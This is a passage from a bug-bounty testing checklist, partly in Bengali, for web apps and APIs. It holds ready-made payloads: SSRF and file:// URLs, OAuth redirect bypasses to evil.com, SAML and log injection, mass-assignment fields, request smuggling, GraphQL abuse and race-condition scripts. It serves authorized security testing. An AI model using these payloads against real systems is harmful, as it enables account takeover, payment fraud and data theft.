{"url": "http://10.0.0.1:6379/"}               ← Redis
{"url": "http://internal-api:3000/admin"}

### DNS rebinding:
# Domain যেটা প্রথমে legitimate IP → later internal IP
# Setup: use rebind.it or similar service
{"url": "http://your-rebind-domain.com/"}

### Protocol smuggling:
{"url": "dict://127.0.0.1:6379/INFO"}   ← Redis commands
{"url": "file:///etc/passwd"}            ← Local file
{"url": "gopher://127.0.0.1:3306/..."}  ← MySQL

### Webhook secret bypass:
# No secret configured → replay any webhook
# Weak secret: brute force HMAC
# Secret in URL: /webhook?secret=weak_secret
# Timing attack on HMAC comparison
```

---

## 11.2 Third-party Integration Bugs

```http
### Slack integration:
# Connect Slack → OAuth token stored
# Test: can integration post to any channel?
# Token scope: chat:write → can it also read messages?

### GitHub integration:
# Read access granted
# Can integration push code? (write access escalation)
# Webhook from GitHub: can payload be manipulated?

### Zapier/Make integration:
# Automation webhook exposed
# POST to webhook → trigger automation
# Payload manipulation → different action?

### Payment gateway callback:
POST /payment/callback HTTP/1.1
{
  "transaction_id": "txn_123",
  "status": "failed",
  "amount": 99.99,
  "signature": "HMAC_SIGNATURE"
}

# Attack — status manipulation:
{
  "transaction_id": "txn_123",
  "status": "success",   ← change
  "amount": 99.99,
  "signature": "HMAC_SIGNATURE"  ← signature still valid for old data?
}

# Attack — amount manipulation:
{
  "transaction_id": "txn_123",
  "status": "success",
  "amount": 0.01,        ← change amount
  "signature": "..."     ← recompute if algorithm known
}
```

---

# 12. 🔐 OAUTH & SSO

## 12.1 OAuth Flow Attacks

```http
### Complete OAuth flow:
1. GET /oauth/authorize?
     client_id=APP_ID&
     redirect_uri=https://app.com/callback&
     response_type=code&
     scope=read:user&
     state=RANDOM_STATE

2. User approves → redirect:
   GET https://app.com/callback?code=AUTH_CODE&state=RANDOM_STATE

3. Exchange code:
   POST /oauth/token
   {"code": "AUTH_CODE", "grant_type": "authorization_code"}

### Attack 1 — Missing state (CSRF):
# state parameter না থাকলে:
1. Attacker starts OAuth flow → gets to provider page
2. Stops before approving
3. Sends that URL to victim
4. Victim approves → attacker's app gets victim's token

### Attack 2 — redirect_uri bypass:
Original: redirect_uri=https://app.com/callback

Bypass attempts:
redirect_uri=https://app.com/callback?extra=https://evil.com
redirect_uri=https://app.com.evil.com/callback
redirect_uri=https://app.com/callback/../evil
redirect_uri=https://app.com%2Fcallback%2F..%2Fevil
redirect_uri=https://evil.com@app.com/callback
redirect_uri=https://app.com/callback%23.evil.com
redirect_uri=https://app.com/callback/
redirect_uri=https://app.com/

### Attack 3 — Authorization code reuse:
1. Auth code পাও
2. Exchange করো → token পাও
3. Same auth code আবার exchange করো → second token?

### Attack 4 — Token in URL fragment leak:
# Implicit flow: token in URL fragment (#)
https://app.com/callback#access_token=SECRET&token_type=Bearer
# Browser history-এ থাকে!
# Referer header-এ থাকে!
# Server logs-এ থাকে!
```

---

## 12.2 Account Linking Takeover

```http
### Pre-account-takeover:
1. victim@gmail.com Gmail account create করো
2. Target app-এ "Connect Google" করো
3. App-এ existing victim@gmail.com account-এ link হয়?

### Link without verification:
POST /api/auth/link-google HTTP/1.1
Authorization: Bearer ATTACKER_TOKEN
{"google_token": "GOOGLE_OAUTH_TOKEN_FOR_VICTIMS_EMAIL"}
# Link victim's Google to attacker's account?

### Unlink and re-link:
1. Link Google account
2. Unlink Google account
3. Re-link → session/permissions properly reset?

### SSO bypass:
# Company uses SSO (Okta, Azure AD)
# Direct password login still works?
POST /api/login {"email": "employee@company.com", "password": "pass"}
# Should redirect to SSO, but doesn't?

### SAML attacks:
# SAML response manipulation:
<saml:Attribute Name="role">
  <saml:AttributeValue>user</saml:AttributeValue>  ← change to admin
</saml:Attribute>

# Signature wrapping attack:
# Valid signature on one element
# Add malicious element → confusion about what's signed

# XML comment injection:
<NameID>admin<!---->.evil@company.com</NameID>
# Parsed as: admin@company.com by some parsers
```

---

# 13. 🔧 API-SPECIFIC ATTACKS

## 13.1 Mass Assignment — Comprehensive

```http
### Find hidden fields:
# Method 1: JS files
grep -r "user\." app.js | grep -E "role|admin|verified|premium"

# Method 2: API documentation
GET /api/swagger.json
GET /api/openapi.yaml

# Method 3: Error messages
PUT /api/users/ME {"unknown_field": "value"}
Response: "Unknown field: unknown_field. Allowed: name, email, bio, role, is_verified"
# Error reveals valid field names!

# Method 4: Old API version
GET /api/v1/users/ME → more fields than v2?

### Registration mass assignment:
POST /api/register HTTP/1.1
{
  "email": "test@test.com",
  "password": "Password123!",
  "name": "Test User",

  # Common hidden fields to try:
  "role": "admin",
  "roles": ["admin", "superuser"],
  "is_admin": true,
  "is_staff": true,
  "is_superuser": true,
  "verified": true,
  "email_verified": true,
  "account_verified": true,
  "premium": true,
  "subscription": "enterprise",
  "plan": "pro",
  "credits": 999999,
  "balance": 999999,
  "access_level": 99,
  "permissions": ["*"],
  "scopes": ["admin:read", "admin:write"],
  "bypass_2fa": true,
  "is_internal": true,
  "employee": true,
  "created_by": "system"
}

### Update mass assignment:
PUT /api/users/MY_ID HTTP/1.1
{
  "name": "Updated Name",

  # Try to add:
  "id": "ADMIN_USER_ID",       ← change ID
  "user_id": "1",               ← admin user ID
  "role": "admin",
  "subscription_end": "2099-12-31",
  "trial_end": "2099-12-31",
  "credits": 999999
}
```

---

## 13.2 API Versioning Exploitation

```http
### Version enumeration:
/api/v1/users      ← try all versions
/api/v2/users
/api/v3/users
/api/v4/users      ← current
/api/v5/users      ← future/beta?
/api/beta/users
/api/alpha/users
/api/dev/users
/api/test/users
/api/staging/users
/api/internal/users
/api/mobile/v1/users
/api/mobile/v2/users

### Old version vulnerabilities:
# v1 might have:
# - No rate limiting
# - No auth check on some endpoints
# - Different (weaker) validation
# - Endpoints removed from docs but still live
# - Debug information in responses

### Version in header:
GET /api/users HTTP/1.1
API-Version: 1    ← try old versions
X-API-Version: 1
Accept: application/vnd.company.v1+json

### Version in content-type:
Accept: application/vnd.api+json;version=1
Content-Type: application/vnd.company+json; version=1.0

### Deprecated endpoint discovery:
# Wayback Machine:
https://web.archive.org/web/*/target.com/api/*

# Old JS files:
# Download old APK versions
# Old swagger docs cached
```

---

## 13.3 HTTP Request Smuggling Basics

```http
### CL.TE (Content-Length takes priority over Transfer-Encoding):
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED_REQUEST

### TE.CL (Transfer-Encoding takes priority):
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

### Obfuscated Transfer-Encoding:
Transfer-Encoding: xchunked
Transfer-Encoding: chunked  (with space)
Transfer-Encoding: chunked\t (with tab)
Transfer-Encoding: x
Transfer-Encoding: trailers

# Use Burp's HTTP Request Smuggler extension for automated testing
```

---

## 13.4 GraphQL Deep Dive

```graphql
### Introspection (schema discovery):
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind }
        args { name type { name } }
      }
    }
  }
}

### Disabled introspection bypass:
# Try alternatives:
{ __type(name: "User") { fields { name } } }

# Clairvoyance tool:
python3 clairvoyance.py -u https://target.com/graphql -o schema.json

### Field suggestion attack:
{
  user {
    passwor  ← typo
  }
}
# Error: "Did you mean 'password'?" → field exists!

### IDOR in GraphQL:
query {
  user(id: "OTHER_USER_ID") {
    email
    phone
    privateData
  }
}

### Batch attack (rate limit bypass):
[
  {"query": "mutation { login(email: \"a@b.com\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"a@b.com\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(email: \"a@b.com\", password: \"pass3\") { token } }"}
  # ... repeat 1000 times in single HTTP request
]

### Nested query DoS:
{
  user {
    friends {
      friends {
        friends {
          friends {
            friends { name }
          }
        }
      }
    }
  }
}
# Exponential DB queries!

### Alias abuse for mass data:
{
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
  # ... repeat for 1000 users
}

### Mutation privilege escalation:
mutation {
  updateUser(
    id: "OTHER_USER_ID",
    role: ADMIN
  ) {
    id
    role
  }
}

### Subscription for real-time data:
subscription {
  newOrder {
    id
    userId
    amount
    creditCardLast4
  }
}
# Real-time data of ALL orders, not just yours?
```

---

# 14. ⚡ RACE CONDITIONS

## 14.1 Race Condition Theory

```
Time-of-Check to Time-of-Use (TOCTOU):

Thread 1: Check balance (100) → sufficient
Thread 2: Check balance (100) → sufficient
Thread 1: Deduct 100 → balance: 0
Thread 2: Deduct 100 → balance: -100!

Window of vulnerability:
[CHECK]...[window]...[USE]
Both threads get into the window → both succeed!
```

## 14.2 Burp Turbo Intruder Scripts

```python
### Script 1 — Single endpoint race:
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=1,
        pipeline=False
    )
    # 30 simultaneous requests:
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)

### Script 2 — Different endpoints (checkout race):
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30)

    # Apply coupon requests:
    coupon_req = '''POST /api/apply-coupon HTTP/1.1
Host: target.com
Authorization: Bearer TOKEN

{"coupon": "SAVE50", "cart_id": "CART_ID"}'''

    for i in range(20):
        engine.queue(coupon_req, gate='race')

    engine.openGate('race')

### Script 3 — Last-byte sync technique:
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=1,
        pipeline=True
    )
    for i in range(5):
        engine.queue(target.req, gate='race')
    engine.openGate('race')
```

## 14.3 curl Race Condition Testing

```bash
### Simple bash race:
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/redeem-coupon" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"coupon": "FREEMONTH"}' &
done
wait
echo "All requests sent"

### With response capture:
mkdir -p /tmp/race_results
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/withdraw" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount": 100}' \
    -o "/tmp/race_results/response_$i.json" &
done
wait
# Check results:
grep -l "success" /tmp/race_results/*.json | wc -l
# Multiple success responses = race condition!

### Python race condition:
import asyncio
import aiohttp

async def send_request(session, url, data, headers):
    async with session.post(url, json=data, headers=headers) as resp:
        return await resp.json()

async def race_condition_test():
    url = "https://target.com/api/redeem"
    data = {"voucher": "VOUCHER_CODE"}
    headers = {"Authorization": "Bearer YOUR_TOKEN"}

    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, data, headers) for _ in range(20)]
        results = await asyncio.gather(*tasks)

    successes = [r for r in results if r.get('success')]
    print(f"Successful: {len(successes)}/{len(results)}")
    for s in successes:
        print(s)

asyncio.run(race_condition_test())
```

## 14.4 Race Condition Target List

```
HIGH VALUE RACE CONDITION TARGETS:

Financial:
□ Withdrawal/transfer
□ Coupon/promo redemption
□ Gift card usage
□ Refund processing
□ Cashback claim
□ Reward point redemption
□ Free trial activation

Account:
□ Email verification (one-time)
□ 2FA disable confirmation
□ Password reset token use
□ Account deletion confirm
□ Invite acceptance

E-commerce:
□ Last item in stock purchase
□ Flash sale item claim
□ Limited edition item
□ Auction bid
□ Early access claim

Social/Gaming:
□ Vote/like (prevent duplicates)
□ Achievement unlock
□ Daily reward claim
□ Tournament entry (limited slots)
□ Referral bonus claim
```

---

# 15. 🏢 MULTI-TENANT / SAAS

## 15.1 Tenant Isolation Testing

```http
### Setup: Create accounts in two different organizations
Account A: org_id=ORG_A, user_id=USER_A, token=TOKEN_A
Account B: org_id=ORG_B, user_id=USER_B, token=TOKEN_B

### Cross-org API access:
# Using TOKEN_A, access ORG_B resources:
GET /api/orgs/ORG_B/members          Authorization: Bearer TOKEN_A
GET /api/orgs/ORG_B/projects         Authorization: Bearer TOKEN_A
GET /api/orgs/ORG_B/billing          Authorization: Bearer TOKEN_A
GET /api/orgs/ORG_B/settings         Authorization: Bearer TOKEN_A
GET /api/orgs/ORG_B/audit-logs       Authorization: Bearer TOKEN_A

### Subdomain/tenant isolation:
# ORG_A uses: org-a.target.com
# Attack with ORG_B's token:
GET https://org-a.target.com/api/data
Authorization: Bearer TOKEN_B_FROM_ORG_B

### Host header tenant confusion:
GET /api/users HTTP/1.1
Host: org-b.target.com              ← different org subdomain
Authorization: Bearer TOKEN_A       ← org A's token

### Tenant parameter manipulation:
GET /api/data?tenant=ORG_A
→ GET /api/data?tenant=ORG_B        ← switch tenant

GET /api/data?org_id=ORG_A
→ GET /api/data?org_id=ORG_B

### Shared resource cross-tenant:
# Template created in ORG_A:
POST /api/orgs/ORG_A/templates {"name": "template1"}
→ template_id: TMPL_123

# Access from ORG_B:
GET /api/templates/TMPL_123         Authorization: Bearer TOKEN_B
# Templates are shared globally?
```

---

## 15.2 Admin Panel Discovery

```http
### Common admin paths to test:
/admin
/admin/
/admin/login
/administration
/administrator
/manage
/management
/dashboard/admin
/control-panel
/controlpanel
/cp
/wp-admin           ← WordPress
/phpmyadmin
/adminer
/staff
/staff/login
/internal
/internal/admin
/ops
/operations
/superadmin
/super-admin
/root
/system

### Hidden in JS:
grep -r "admin\|staff\|internal" *.js
grep -r "/api/admin" app.bundle.js

### HTTP response clues:
# 401 instead of 404 → exists but needs auth!
# 302 redirect to login → exists!
# Different response size → something there
```

---

# 16. 📊 NOTIFICATION & AUDIT LOG BYPASS

## 16.1 Silent Action Discovery

```http
### Actions that might not notify:
API calls vs UI actions:
- UI: "Change email" → sends notification to old email
- API: PUT /api/users/ME {"email": "new@email.com"}
  → Same notification? or silent?

### Test notification coverage:
For each sensitive action, check:
□ Email notification sent?
□ SMS notification sent?
□ In-app notification created?
□ Audit log entry created?
□ Security alert triggered?

Actions to test:
□ Password change
□ Email change
□ 2FA enable/disable
□ New device login
□ API key creation/deletion
□ Permission change
□ Bulk data export
□ Account settings change
□ Billing method change
□ Team member role change

### Notification suppression:
POST /api/settings/change-email HTTP/1.1
{
  "new_email": "attacker@evil.com",
  "send_notification": false,    ← suppress notification?
  "notify_old_email": false      ← skip old email alert?
}

### Batch operation notification gap:
# Single operation: notification sent
# Bulk operation (1000 items): notification per item? or summary? or none?
POST /api/bulk-delete {"ids": ["id1", "id2", ... "id1000"]}
# 1000 deletions with 0 or 1 notification
```

---

## 16.2 Audit Log Manipulation

```http
### Log injection:
POST /api/login HTTP/1.1
{
  "email": "admin@company.com\nINFO 2024-01-01: Admin logged in successfully",
  "password": "wrong"
}
# Log entry injected to cover tracks

### User-Agent log injection:
GET /api/data HTTP/1.1
User-Agent: Mozilla/5.0\n2024-01-01 INFO: Security scan complete, no issues found

### Timing-based audit gap:
# Some systems log asynchronously
# Action happens → log written later
# Between action and log: delete the data?
# Log shows action but data already gone?

### Log access testing:
GET /api/audit-logs                         → 403 (normal)
GET /api/audit-logs?user_id=MY_ID          → 200 (your logs)
GET /api/audit-logs?user_id=OTHER_USER_ID  → 200? (IDOR)
GET /api/audit-logs?org_id=OTHER_ORG       → 200? (cross-org)
GET /api/audit-logs?level=debug            → more details?
GET /api/audit-logs?include_deleted=true   → deleted logs?
```

---

# 17. 📱 MOBILE API vs WEB API

## 17.1 Mobile Endpoint Discovery

```bash
### APK analysis:
# Download APK from APKPure/APKMirror
# Decompile with jadx:
jadx -d output/ target.apk

# Search for endpoints:
grep -r "api\|endpoint\|url\|baseurl" output/ --include="*.java" -i
grep -r "https\?://" output/ --include="*.java"

# Search for secrets:
grep -r "secret\|key\|token\|password\|api_key" output/ -i

### iOS IPA analysis:
# Extract IPA
unzip target.ipa -d extracted/

# Search binary:
strings extracted/Payload/App.app/App | grep "api\|https"

# Class-dump for headers:
class-dump extracted/Payload/App.app/App > headers.h
grep -i "api\|endpoint\|url" headers.h

### Traffic interception:
# Android: install Burp CA cert
# iOS: trust Burp CA in settings
# Proxy all traffic through Burp

# Certificate pinning bypass:
# Frida script:
frida -U -l bypass-pinning.js -f com.target.app
```

---

## 17.2 Mobile-Specific Vulnerabilities

```http
### Different validation on mobile endpoints:
Web endpoint (strict):
POST /api/v2/users/update HTTP/1.1
{"role": "admin"} → 400 "Cannot change role"

Mobile endpoint (lenient):
POST /api/mobile/v1/users/update HTTP/1.1
{"role": "admin"} → 200! "Role updated"

### Mobile auth token vs web token:
# Mobile login → mobile_token
# Test mobile_token on web endpoints:
GET /api/web/admin/users
Authorization: Bearer MOBILE_TOKEN
# Different token validation?

### App version bypass:
GET /api/data HTTP/1.1
X-App-Version: 1.0.0         ← old version
User-Agent: App/1.0.0

# Old app version might access deprecated endpoints
# Or bypass new security checks

### Mobile-specific parameters:
GET /api/data HTTP/1.1
X-Device-ID: DEVICE_ID        ← can be faked
X-Platform: android           ← change to ios?
X-App-Build: 1000             ← old build number

### Deep link abuse:
# App handles deep links:
target://app/reset?token=XXX
target://app/admin/dashboard
target://app/profile?user_id=OTHER_ID

# Test all deep link parameters
```

---

# 18. 🔮 GRAPHQL (Extended)

## 18.1 Authorization Bypass Patterns

```graphql
### Missing authorization on mutation:
mutation {
  deleteUser(id: "OTHER_USER_ID") {
    success
  }
}

mutation {
  updateUserRole(userId: "OTHER_USER_ID", role: ADMIN) {
    success
  }
}

mutation {
  transferOwnership(fromUserId: "VICTIM_ID", toUserId: "MY_ID") {
    success
  }
}

### IDOR through nested resolvers:
query {
  myProfile {               ← authenticated, authorized
    organization {          ← your org
      allMembers {          ← should be admin only?
        email
        role
        lastLogin
      }
    }
  }
}

### Subscription unauthorized access:
subscription {
  orderCreated {            ← all orders? or just mine?
    id
    userId
    amount
    items { name, price }
  }
}

subscription {
  userLoggedIn {            ← all user logins?
    userId
    email
    ipAddress
    timestamp
  }
}
```

---

## 18.2 GraphQL Injection

```graphql
### Argument injection:
query {
  user(id: "1\") { id } user(id: \"1") {
    sensitiveData
  }
}

### Variable injection:
query GetUser($id: ID!) {
  user(id: $id) { email }
}
Variables: {"id": "1\") { allUsers { email } } #"}

### Fragment abuse:
fragment UserFields on User {
  email
  ... on AdminUser {     ← type condition
    adminSecret
    allUserData
  }
}

query {
  me { ...UserFields }
}
```

---

# 19. 🔄 FEATURE INTERACTION BUGS

## 19.1 Dangerous Feature Combinations

```
### Combination 1: 2FA + Remember Device + Account Sharing
Setup: Enable 2FA, "Remember this device" for 30 days
Attack: 
  - Device is "remembered" (no 2FA needed)
  - Change password → device still remembered?
  - 2FA disable → does it invalidate remembered devices?
  - Logout → device still remembered when logging back in?

### Combination 2: API Key + IP Whitelist + Rate Limit
Setup: API key with IP whitelist configured
Attack:
  - IP whitelist bypassed? (X-Forwarded-For)
  - Rate limit per key or per IP?
  - Multiple API keys = multiple rate limits?
  - Revoke key → requests in-flight still process?

### Combination 3: Bulk Action + Pagination + Authorization
Setup: 
  GET /api/items?page=1&limit=100
  You can only see 50 items (authorization filter)
  
Attack:
  POST /api/items/bulk-delete {"ids": ["YOUR_50_IDS", "OTHER_50_IDS"]}
  # Bulk action checks authorization per item?
  # Or just checks if you can bulk-delete (role check only)?

### Combination 4: Search + Export + Filter
Normal: Search returns filtered results (only yours)
Export: Exports search results
Attack:
  1. Search with no filters → returns your items only
  2. Note: export endpoint uses same query?
  3. Export directly: POST /api/export {"query": ""}
  4. Does export apply same filters? Or export everything?

### Combination 5: Scheduled Job + Permission Change
Setup: Schedule a report to run nightly
Attack:
  1. Schedule report (requires premium)
  2. Downgrade to free
  3. Scheduled job still runs with premium data access?
  4. Job runs as: original user's permissions or current permissions?
```

---

## 19.2 State Machine Confusion

```
### Order state machine:
CREATED → PENDING_PAYMENT → PAID → PROCESSING → SHIPPED → DELIVERED → REFUNDED

Valid transitions only:
CREATED → PENDING_PAYMENT ✓
PAID → REFUNDED ✓
DELIVERED → REFUNDED ✓

Invalid (test these):
CREATED → DELIVERED (skip payment) ?
REFUNDED → DELIVERED (refund then claim delivered) ?
DELIVERED → PAID (already delivered, re-process payment) ?

### API state manipulation:
POST /api/orders/ORDER_ID/mark-delivered HTTP/1.1
(even though order is in PENDING_PAYMENT state)

POST /api/orders/ORDER_ID/ship HTTP/1.1
(even though payment not received)

### Subscription state:
TRIAL → ACTIVE → CANCELLED → TRIAL? (should be blocked)
ACTIVE → PAUSED → ACTIVE → PAUSED (unlimited pause?)

### User account state:
ACTIVE → SUSPENDED → ACTIVE (without admin action?)
ACTIVE → DELETED → ACTIVE (resurrection?)
PENDING_VERIFICATION → ACTIVE (skip verification?)
```

---

# 20. 🗺️ RECON & MAPPING STRATEGY

## 20.1 Complete Recon Automation

```bash
#!/bin/bash
# Complete recon script for bug bounty

TARGET="target.com"
OUTPUT_DIR="./recon_$TARGET"
mkdir -p $OUTPUT_DIR

echo "[*] Starting recon for $TARGET"

# Step 1: Subdomain enumeration
echo "[*] Subdomain enumeration..."
subfinder -d $TARGET -silent > $OUTPUT_DIR/subdomains_subfinder.txt
amass enum -passive -d $TARGET > $OUTPUT_DIR/subdomains_amass.txt
assetfinder $TARGET > $OUTPUT_DIR/subdomains_assetfinder.txt

# Merge and deduplicate:
cat $OUTPUT_DIR/subdomains_*.txt | sort -u > $OUTPUT_DIR/all_subdomains.txt
echo "[+] Found $(wc -l < $OUTPUT_DIR/all_subdomains.txt) subdomains"

# Step 2: Live host discovery
echo "[*] Checking live hosts..."
cat $OUTPUT_DIR/all_subdomains.txt | \
  httpx -silent -status-code -title -tech-detect \
  -o $OUTPUT_DIR/live_hosts.txt
echo "[+] Live hosts: $(wc -l < $OUTPUT_DIR/live_hosts.txt)"

# Step 3: URL collection
echo "[*] Collecting URLs..."
cat $OUTPUT_DIR/all_subdomains.txt | waybackurls > $OUTPUT_DIR/wayback_urls.txt
cat $OUTPUT_DIR/live_hosts.txt | katana -jc -silent > $OUTPUT_DIR/katana_urls.txt
cat $OUTPUT_DIR/wayback_urls.txt $OUTPUT_DIR/katana_urls.txt | \
  sort -u > $OUTPUT_DIR/all_urls.txt

# Step 4: JS file extraction
grep "\.js" $OUTPUT_DIR/all_urls.txt | sort -u > $OUTPUT_DIR/js_files.txt
echo "[+] JS files: $(wc -l < $OUTPUT_DIR/js_files.txt)"

# Step 5: Endpoint extraction from JS
while read url; do
  python3 linkfinder.py -i "$url" -o cli 2>/dev/null
done < $OUTPUT_DIR/js_files.txt | sort -u > $OUTPUT_DIR/endpoints_from_js.txt

# Step 6: Interesting file discovery
grep -E "\.(json|xml|yaml|yml|config|env|backup|sql|log)$" \
  $OUTPUT_DIR/all_urls.txt > $OUTPUT_DIR/interesting_files.txt

# Step 7: Parameter discovery
cat $OUTPUT_DIR/all_urls.txt | grep "?" | \
  sed 's/=.*/=/' | sort -u > $OUTPUT_DIR/parameterized_urls.txt

echo "[+] Recon complete! Check $OUTPUT_DIR/"
```

---

## 20.2 API Documentation Hunting

```bash
### Common API doc locations:
/swagger.json
/swagger.yaml
/swagger/
/swagger-ui.html
/swagger-ui/
/api-docs
/api-docs.json
/api/docs
/openapi.json
/openapi.yaml
/v1/swagger.json
/v2/swagger.json
/v3/swagger.json
/api/swagger
/api/swagger.json
/docs/api
/redoc
/graphql         ← try introspection
/graphiql        ← GraphQL IDE (should be disabled in prod)
/.well-known/openapi

### Check with ffuf:
ffuf -u https://target.com/FUZZ \
  -w api_docs_wordlist.txt \
  -mc 200,201,301,302 \
  -o api_docs_found.txt

### Postman collections:
https://www.postman.com/search?q=target.com
# Companies sometimes publish API collections publicly!

### GitHub:
site:github.com "target.com" "api"
site:github.com "api.target.com"
# Find leaked API docs, collections, keys
```

---

## 20.3 Old Program Bug Strategy

```
OLD PROGRAM RECON APPROACH:

1. Historical JS files:
   - Wayback Machine: web.archive.org/web/*/target.com/*.js
   - Download old JS → compare with current
   - Find: deprecated endpoints, old features, removed parameters

2. APK version history:
   - Download multiple APK versions from APKMirror
   - Compare API endpoints across versions
   - Old versions often have less security

3. GitHub history:
   - git log --all --full-history -- "**/*.js"
   - Search: github.com/target-company (public repos)
   - Check: accidentally committed secrets, old API docs

4. Web Archive crawling:
   curl "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey" \
   | grep -E "\.js|\.json|/api/"

5. Old bug reports:
   - HackerOne Hacktivity: search target name
   - Disclosed reports reveal: past vulnerabilities, code patterns
   - Same vulnerability class might still exist in new features

6. Technology fingerprinting:
   - Old programs: outdated frameworks with known CVEs
   - Ruby on Rails mass assignment (older versions)
   - Laravel debug mode left on
   - Express.js without security middleware

7. Feature creep areas (most bugs here):
   - Mobile app added after main app → less tested API
   - Enterprise features added for big clients → rushed development
   - Third-party integrations → trust issues
   - Webhook systems → often afterthought
   - Batch/bulk operations → auth checks often missed
```

---

## 20.4 Testing Priority Matrix

```
SEVERITY × PROBABILITY MATRIX:

CRITICAL + HIGH PROBABILITY:
1. IDOR on financial data (orders, invoices, payments)
2. Account takeover via password reset
3. Authentication bypass (2FA, OTP)
4. Race conditions on financial operations
5. Mass assignment on registration

CRITICAL + MEDIUM PROBABILITY:
6. SSRF via webhook/integration
7. JWT vulnerabilities
8. OAuth account linking takeover
9. Privilege escalation to admin
10. Multi-tenant data isolation bypass

HIGH + HIGH PROBABILITY:
11. IDOR on user data (profile, settings)
12. Missing authorization on sensitive endpoints
13. Subscription/billing manipulation
14. Export data scope bypass
15. API versioning vulnerabilities

HIGH + MEDIUM PROBABILITY:
16. Race conditions on non-financial ops
17. File upload vulnerabilities
18. GraphQL authorization bypass
19. Session management issues
20. Host header injection

MEDIUM + HIGH PROBABILITY:
21. Information disclosure via error messages
22. Verbose API responses (extra fields)
23. Rate limiting bypass
24. Audit log bypass
25. Notification suppression

FOCUS ORDER FOR OLD PROGRAMS:
1. New mobile API endpoints (less tested)
2. Third-party integrations (afterthoughts)
3. Bulk/batch operations (auth checks missed)
4. Admin functionality accessible to lower roles
5. Old API versions still live
```

---

## 20.5 Bug Report Template

```markdown
## Summary
[One sentence description of the vulnerability]

## Severity
[Critical/High/Medium/Low] — [CVSS score if applicable]

## Affected Endpoint
[HTTP Method] [Full URL]

## Steps to Reproduce
1. Login as normal user (user@test.com / password123)
2. Navigate to [URL]
3. Intercept request with Burp Suite
4. Modify [parameter] from [original value] to [malicious value]
5. Forward request
6. Observe [malicious outcome]

## Proof of Concept
```
[Actual HTTP request]
```

## Response
```
[Server response showing vulnerability]
```

## Impact
[What an attacker can achieve]
[Business impact]
[Data at risk]

## Remediation
[Suggested fix]

## Supporting Evidence
[Screenshots, videos, additional requests]
```

---

## 20.6 Burp Suite Setup for Business Logic Testing

```
Essential Burp Extensions:
1. Autorize — automatic authorization testing
   - Add attacker token
   - Browse as victim → Autorize tests each request with attacker token
   - Red = unauthorized access possible!

2. Param Miner — hidden parameter discovery
   - Right-click request → Extensions → Param Miner → Guess params
   - Finds hidden parameters in forms, JSON, headers

3. Turbo Intruder — race conditions
   - Scripts provided in Section 14

4. JWT Editor — JWT attacks
   - Modify JWT payload, change algorithm
   - Attack known vulnerabilities

5. HTTP Request Smuggler — smuggling attacks
   - Automated detection of CL.TE and TE.CL

6. Logger++ — advanced logging
   - Log all requests with custom filters
   - Export for analysis

7. Active Scan++ — enhanced scanning
   - Additional scan checks

Burp Suite Tips:
- Scope: add target to scope, filter out-of-scope noise
- Compare site map: two users' site maps side by side
- Session handling: record login macro for automatic re-auth
- Match and Replace: auto-modify headers in all requests
- Intruder: use Pitchfork for correlated payloads
```

---

*This checklist is for authorized security testing only.*
*Always have written permission before testing.*
*Happy hunting! 🎯*
